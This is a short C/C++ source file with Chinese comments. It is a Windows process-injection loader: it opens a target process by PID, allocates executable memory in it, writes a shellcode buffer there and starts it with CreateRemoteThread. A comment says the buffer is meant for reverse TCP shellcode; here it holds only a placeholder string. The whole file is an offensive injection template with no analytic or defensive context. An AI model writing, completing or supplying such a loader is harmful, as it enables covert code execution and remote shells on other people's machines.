#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

//嵌入反向TCP Shellcode
unsigned char shellcode[] = "Shellcode";

unsigned int shellcode_len = sizeof(shellcode);

int main(int argc, char* argv[]) {
  HANDLE ph;
  HANDLE rt;
  PVOID rb;

  //解析输入的进程ID
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  //为远程进程分配内存缓冲区
  rb = VirtualAllocEx(ph, NULL, shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  //复制进程数据
  WriteProcessMemory(ph, rb, shellcode, shellcode_len, NULL);

  //进程启动新线程
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  CloseHandle(ph);
  return 0;
}
